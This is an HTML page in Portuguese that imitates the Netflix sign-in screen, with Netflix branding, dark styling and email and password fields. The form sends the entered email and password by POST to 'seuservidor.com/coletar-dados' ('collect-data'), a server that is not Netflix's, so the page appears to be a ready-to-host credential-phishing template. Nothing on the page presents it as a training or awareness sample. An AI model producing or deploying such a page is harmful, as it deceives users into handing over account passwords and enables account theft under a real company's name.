<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Netflix</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"/>
  <style>
    body {
      margin: 0;
      background-color: #141414;
      font-family: 'Roboto', sans-serif;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background-color: rgba(0,0,0,0.85);
      padding: 40px;
      width: 300px;
      border-radius: 8px;
    }
    h1 {
      margin-bottom: 24px;
      font-size: 28px;
      color: red;
      text-align: center;
    }
    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      background-color: #333;
      border: none;
      border-radius: 4px;
      color: white;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: red;
      border: none;
      border-radius: 4px;
      color: white;
      font-weight: bold;
      margin-top: 12px;
      cursor: pointer;
    }
    .text-small {
      font-size: 12px;
      color: #aaa;
      margin-top: 12px;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <h1>Netflix</h1>
    <form action="https://seuservidor.com/coletar-dados" method="POST">
      <input type="email" name="email" placeholder="Email ou nÃºmero de telefone" required />
      <input type="password" name="senha" placeholder="Senha" required />
      <button type="submit">Entrar</button>
    </form>
    <p class="text-small">Novo por aqui? <a href="#" style="color: white;">Assine agora.</a></p>
  </div>
</body>
</html>
